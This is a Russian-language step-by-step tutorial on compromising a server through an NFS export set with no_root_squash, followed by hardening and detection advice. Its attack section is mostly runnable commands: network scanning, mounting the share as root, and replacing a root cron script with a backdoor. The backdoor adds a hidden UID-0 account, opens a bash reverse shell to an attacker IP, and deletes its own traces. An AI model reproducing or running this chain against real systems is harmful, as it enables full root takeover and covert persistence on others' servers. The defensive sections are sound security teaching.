### Детальный пример атаки: Подмена системного скрипта через NFS с `no_root_squash` с пошаговыми пояснениями

#### Шаг 1: Обнаружение и анализ (Discovery)
**Цель:** Найти уязвимые NFS-серверы и проверить их конфигурацию.

**Команды:**
```bash
nmap -sU -p111 --open 192.168.1.0/24 -oG nfs-servers.txt
showmount -e 192.168.1.100
```

**Пояснения:**
1. `nmap -sU -p111`: UDP-сканирование порта 111 (rpcbind), который всегда используется NFS
2. `--open`: Показать только открытые порты
3. `-oG nfs-servers.txt`: Сохранить результаты в grep-формате
4. `showmount -e`: Показать экспортированные директории на конкретном сервере

**Ключевая находка:**  
Директория `/scripts` экспортирована для всех (`everyone`) с правами чтения/записи.

---

#### Шаг 2: Подготовка к атаке (Privilege Escalation)
**Цель:** Получить возможность создавать файлы от имени root на сервере.

**Команды:**
```bash
mkdir -p /mnt/nfs_scripts
sudo mount -t nfs -o vers=3,nolock,proto=tcp,uid=0,gid=0 192.168.1.100:/scripts /mnt/nfs_scripts
echo "Test file" | sudo tee /mnt/nfs_scripts/test_file
ls -n /mnt/nfs_scripts/test_file
```

**Пояснения:**
1. `mkdir -p`: Создать точку монтирования (если не существует)
2. Параметры монтирования:
   - `vers=3`: Версия протокола NFS
   - `nolock`: Отключить блокировки (упрощает эксплуатацию)
   - `proto=tcp`: Использовать TCP вместо UDP (надежнее)
   - `uid=0,gid=0`: Принудительно устанавливать владельца файлов как root
3. `tee`: Создать тестовый файл и вывести содержимое
4. `ls -n`: Показать UID/GID файла (0 = root)

**Почему это работает:**  
Опция `no_root_squash` в `/etc/exports` позволяет сохранять root-права при записи файлов.

---

#### Шаг 3: Анализ содержимого
**Цель:** Найти скрипты, выполняемые с привилегиями root.

**Команды:**
```bash
ls -la /mnt/nfs_scripts
cat /mnt/nfs_scripts/daily_backup.sh
```

**Пояснения:**
1. `ls -la`: Показать подробный список файлов с владельцами
2. `cat`: Просмотреть содержимое скрипта резервного копирования
3. Ищем:
   - Скрипты, принадлежащие root
   - Скрипты, выполняемые по расписанию
   - Скрипты с правами на выполнение (x)

**Ключевая находка:**  
Скрипт `daily_backup.sh` выполняется ежедневно от имени root и делает резервные копии данных.

---

#### Шаг 4: Подготовка вредоносного скрипта (Execution)
**Цель:** Создать скрипт, который даст контроль над системой.

**Код скрипта:**
```bash
cat << 'EOF' | sudo tee /mnt/nfs_scripts/evil_backdoor.sh
#!/bin/bash

# 1. Добавление скрытого пользователя
echo "backdoor:\$6\$salt\$hash:0:0:root:/root:/bin/bash" >> /etc/passwd

# 2. Обратный шелл для немедленного доступа
bash -c "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1" &

# 3. Выполнение оригинального скрипта
/bin/bash /scripts/daily_backup.sh.orig

# 4. Удаление следов
rm /scripts/evil_backdoor.sh
mv /scripts/daily_backup.sh.orig /scripts/daily_backup.sh
EOF
```

**Пояснения компонентов:**
1. **Добавление пользователя:**
   - `backdoor`: Имя пользователя
   - `\$6\$salt\$hash`: Хэш SHA-512 пароля (например, `P@ssw0rd`)
   - `0:0`: UID и GID root
   - `/bin/bash`: Оболочка по умолчанию

2. **Обратный шелл:**
   - `bash -i`: Интерактивная оболочка
   - `>& /dev/tcp/...`: Перенаправление ввода/вывода в TCP-соединение
   - `0>&1`: Перенаправление stdin в stdout
   - `&`: Запуск в фоновом режиме

3. **Маскировка:**
   - Выполнение оригинального скрипта скрывает факт атаки
   - Администратор не заметит сбоя в работе

4. **Скрытие следов:**
   - Удаление вредоносного скрипта
   - Восстановление оригинального имени файла

---

#### Шаг 5: Подмена системного скрипта
**Цель:** Заменить легитимный скрипт на вредоносный.

**Команды:**
```bash
sudo mv /mnt/nfs_scripts/daily_backup.sh /mnt/nfs_scripts/daily_backup.sh.orig
sudo mv /mnt/nfs_scripts/evil_backdoor.sh /mnt/nfs_scripts/daily_backup.sh
sudo chmod +x /mnt/nfs_scripts/daily_backup.sh
```

**Пояснения:**
1. `mv`: Переименование файлов
2. `chmod +x`: Установка права на выполнение (обязательно для скриптов)
3. Последовательность действий:
   - Сохранить оригинальный скрипт как резервную копию
   - Переименовать вредоносный скрипт в имя оригинального
   - Установить те же права доступа

**Важно:**  
Без `chmod +x` cron не сможет выполнить скрипт, и атака провалится.

---

#### Шаг 6: Ожидание и получение доступа
**Цель:** Получить контроль над сервером при срабатывании скрипта.

**На атакующей машине:**
```bash
nc -nvlp 4444
```

**Пояснения:**
1. `nc -nvlp 4444`: Утилита netcat слушает порт 4444
   - `-n`: Не преобразовывать доменные имена
   - `-v`: Подробный вывод
   - `-l`: Режим прослушивания
   - `-p`: Указание порта

**Что происходит на сервере:**
1. Cron запускает `daily_backup.sh` от root в 3:00 AM
2. Скрипт добавляет пользователя `backdoor` в `/etc/passwd`
3. Устанавливается обратное TCP-соединение с атакующим
4. Оригинальный скрипт выполняется для маскировки
5. Вредоносный скрипт самоликвидируется

---

### Технический анализ: Почему это работает

**Проблема 1: Неправильная настройка NFS**
```bash
# Опасная конфигурация:
/home *(rw,sync,no_root_squash)

# Безопасная альтернатива:
/home 192.168.1.0/24(rw,sync,root_squash,all_squash)
```

**Проблема 2: Выполнение скриптов от root**
```bash
# В /etc/crontab:
0 3 * * * root /scripts/daily_backup.sh  # Опасность!

# Безопаснее:
0 3 * * * backup-user /scripts/daily_backup.sh
```

**Проблема 3: Отсутствие контроля целостности**
- Нет проверки хэшей системных файлов
- Нет мониторинга изменений в критичных директориях

---

### Защитные меры с пояснениями

**1. Безопасная конфигурация NFS:**
```bash
# /etc/exports
/scripts 192.168.1.0/24(rw,sync,root_squash,all_squash,anonuid=65534,anongid=65534)
```
- `root_squash`: Превращает root-запросы в анонимные
- `all_squash`: Все пользователи становятся анонимными
- `anonuid/anongid`: Явное указание UID/GID для анонимных пользователей

**2. Регулярный аудит:**
```bash
# Проверка SUID-файлов
find / -perm -4000 -exec ls -ld {} \; > /var/log/suid_audit.log

# Проверка изменений в cron
aide --check | grep /etc/cron
```

**3. Принцип минимальных привилегий:**
```bash
# Создание отдельного пользователя для задач
adduser --system --no-create-home backup-user
chown -R backup-user:backup-user /scripts
```

**4. Мониторинг сетевой активности:**
```bash
# Обнаружение обратных шеллов
iptables -A OUTPUT -p tcp -m state --state NEW -j LOG --log-prefix "OUTBOUND: "
grep "OUTBOUND: " /var/log/syslog | grep -E 'dport=4444'
```

**5. Изоляция задач:**
```bash
# Systemd scope
systemd-run --user --scope -p IPAddressDeny=any -p IPAddressAllow=192.168.1.50 /scripts/daily_backup.sh
```

**6. SELinux/AppArmor:**
```bash
# AppArmor профиль для cron-задачи
profile cron-daily-backup /scripts/daily_backup.sh {
  deny /etc/passwd w,
  deny network,
  /bin/bash ix,
  /usr/bin/tar mrix,
}
```

---

### Детектирование атаки: Ключевые индикаторы

**1. Файловые изменения:**
```bash
# Проверка последних измененных файлов
find /scripts -mtime -1 -ls

# Проверка /etc/passwd
stat /etc/passwd | grep "Modify"
```

**2. Сетевые аномалии:**
```bash
# Просмотр активных соединений
ss -tunp | grep 192.168.1.50

# Проверка исходящих соединений
tcpdump -ni any dst 192.168.1.50 and dst port 4444
```

**3. Процессные аномалии:**
```bash
# Поиск необычных процессов
ps auxf | grep -E 'bash -i|nc -l'

# Проверка дочерних процессов cron
systemctl status cron | grep "ExecStart"
```

**4. Cron-активность:**
```bash
# Просмотр логов cron
grep CRON /var/log/syslog | grep daily_backup

# Проверка времени выполнения
echo "Время выполнения: $(stat -c %y /scripts/daily_backup.sh)"
```

Этот пример демонстрирует, как критически важна правильная настройка сетевых сервисов. Всего одна опция `no_root_squash` может привести к полному компрометированию системы. Регулярный аудит, принцип минимальных привилегий и многоуровневый мониторинг - ключ к предотвращению подобных атак.